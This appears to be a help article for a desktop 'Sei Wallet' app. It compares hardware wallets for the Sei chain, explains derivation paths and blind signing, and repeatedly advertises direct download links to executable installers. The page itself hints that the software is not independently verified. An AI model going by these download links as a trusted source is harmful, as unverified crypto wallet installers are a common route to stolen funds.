![Sei Wallet](https://github.com/sei-chain/sei-wallet-help/raw/main/assets/banner-article.png)

<h1 align="center">Hardware wallets that work with SEI and Sei Wallet</h1>

<p align="center">Which devices the app supports today, and what each one needs.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Short answer: Sei's own documentation lists **two** hardware wallets with EVM support — Ledger and Arculus. Everything else you will see recommended for "SEI" is either a software wallet, or a device whose Sei support nobody has documented, including the two names people ask about most: Trezor and Tangem.

That distinction matters because a hardware wallet that cannot sign a Sei transaction is not a hardware wallet for Sei. It may hold the same seed, and it may show you an address, but if it cannot approve an EVM transaction on chain 1329, your funds stay where they were.

This article covers what the documentation actually says, what it leaves open, and how to judge a device the docs do not mention.

## What Sei's documentation lists

The wallet guide's hardware table has two rows. Both show EVM support, both show Cosmos support, and both are marked as using coin types 118 and 60 — the two derivation paths, one Cosmos, one Ethereum.

| Device | EVM | Cosmos | Coin types | Mobile |
|---|---|---|---|---|
| Ledger | Yes | Yes | 118 / 60 | No |
| Arculus | Yes | Yes | 118 / 60 | Yes |

Two things follow from that table, and one thing does not.

**Ledger is the documented path with the most detail.** Sei's hardware-wallet guide describes installing the Ethereum app, or the dedicated Sei app from the Ledger Live catalogue, and signing through an EVM wallet. The EVM setup page adds that the Ethereum app works with any EVM chain and that the native Sei app "may provide optimal compatibility" — a hedge worth noticing.

**Arculus appears as supported**, with mobile support that Ledger's row does not claim. What the documentation does not say is whether a desktop application can talk to it. I checked the pages for this product and found no Arculus mention at all, so treat it as "supported by the chain, unverified with this app" rather than a recommendation.

**Trezor is not in the table.** Neither is Tangem, SafePal, Keystone or any other device. Their absence is not evidence that they fail — it is absence of documentation. NO DATA, not "unsupported".

## What "works" has to mean

A device is usable here when four things hold:

1. **It signs EVM transactions on Sei.** Holding a key is not signing; the device must be able to approve a transaction for chain ID 1329.
2. **The app can request an account from it.** Some devices expose accounts through a standard the app can speak; some require their own bridge software.
3. **It displays the address and the transaction** on its own screen, which is the entire security benefit.
4. **It can show the account your funds are actually in.** With two derivation paths in play, this is a real failure mode rather than a formality.

A device that satisfies 1–3 but not 4 will connect, show an address, and show a zero balance. That is not a device fault; it is a derivation mismatch, and [the address mismatch](https://github.com/sei-chain/sei-wallet-help/blob/main/why-the-device-shows-another-address.md) explains how to work through it.

## Ledger, in practice

The operator names three models — Nano S+, Nano X and Stax — and routes signing through Ledger's Ethereum app. That matches Sei's own guidance, so the two agree on the path.

Two details are worth knowing before you buy one for this purpose:

- **The Ethereum app, not the Cosmos app.** Sei is EVM-first under SIP-03, and the Cosmos-native signing path is deprecated. A guide that tells you to use the Cosmos app is describing the older route.
- **Blind signing may be required.** Sei's setup page is blunt about it: switch on blind signing in the device app, or arbitrary EVM calls and contract interactions are refused. Enabling it widens what a malicious request can get signed, which is why the setting deserves its own explanation rather than a toggle: [the blind-signing setting](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md).

The pairing procedure, including the pre-connection address check that prevents the whole mismatch class, is in [the Ledger pairing steps](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md).

## Coin type 60 versus 118

The two numbers in the table are derivation paths, and they explain why one device can present two accounts.

- **Coin type 60** is the Ethereum path. An EVM wallet asks for this, and it produces the `0x…` account your EVM activity uses.
- **Coin type 118** is the Cosmos path. A Cosmos wallet asks for this, and it produces the `sei1…` account.

Both are derived from the same seed, so both are "your" accounts — and only one of them is the one holding your balance. This is the mechanism behind almost every "my Ledger shows the wrong address" report, and it applies to any pair of wallets with different derivations, not just this one.

## Devices the documentation does not cover

**Trezor.** Not in Sei's hardware table, and I found no Sei documentation describing a Trezor signing path. Trezor's own site is the place to check whether it supports Sei's EVM chain; I did not verify it, so I am not going to assert either answer here.

**Tangem.** Not in the hardware table either. Tangem does appear in one Sei-adjacent list — the wallet options for an address-association tool — where it is grouped with EVM wallets. That is a statement about connecting a wallet to a web app, not about a documented hardware signing path for Sei transactions, and the two should not be conflated.

**Anything else.** The same rule applies: absence from the table is not a verdict, it is a gap. If a vendor claims Sei support and Sei's docs do not mention the device, you have one claim and no corroboration.

## How to evaluate a device the docs do not list

Before spending money on a device for Sei specifically, get four answers in writing:

1. Does the vendor name Sei, or only "EVM-compatible chains"?
2. Does it sign transactions, or only store and display keys?
3. Can it show the receiving address on its own screen?
4. Does it work with the wallet you intend to use, or only with the vendor's own app?

A vendor that answers all four specifically is worth considering even without Sei documentation. A vendor that answers only the second is selling you a key store, and a key store with no signing path does not secure a Sei balance — it just moves where the key sits.

One further question, if you hold a cold balance: **can it export a key or seed if you need to migrate?** A device that cannot export anything is safe against theft and brittle against everything else, including a vendor going out of business.

## What a hardware wallet does and does not fix

It isolates keys from a general-purpose computer, which is a real gain against malware and clipboard attacks. It does not fix the other attack surfaces:

- a fake download, which defeats the app regardless of the device;
- an approval you did not read on the device screen;
- a seed phrase typed into a website;
- a bridge or wrapped asset that is not native SEI — [bridge representations](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md) are a separate trap.

What is and is not verified about the software itself is set out in [what is and is not verified](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md). Buying a device does not change any of it.

## Frequently asked questions

**What is the best hardware wallet for SEI?** Ledger is the only device both Sei's documentation and this app describe in detail. "Best" beyond that depends on whether you need mobile support, which Arculus claims and Ledger's documentation row does not.

**Does Trezor support SEI?** Not documented by Sei, and I did not verify Trezor's own claims. Ask the vendor before buying for this purpose.

**Does Tangem work with SEI?** Unverified. It appears in a Sei-adjacent wallet list for address association, which is not the same as a documented hardware signing path.

**Which Ledger models are supported here?** Three, per the operator's own list: Nano S+, Nano X and Stax.

**Do I need to enable blind signing?** Sei's EVM setup page says to enable it for arbitrary EVM transactions and contract calls. It is a real security trade-off, not a default to flip without reading.

**Can I stake with a hardware wallet?** Yes, with a device confirmation for each transaction, including unbonding later.

**Why does my device show a different address than my other wallet?** Different derivation — coin type 60 versus 118. Both are real accounts from the same seed.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Why a Ledger shows a different Sei address in Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/why-the-device-shows-another-address.md)
- [Blind signing when Sei Wallet uses a Ledger](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md)
- [Using a Ledger hardware wallet with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md)
- [Bridging SEI from Ethereum into Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md)
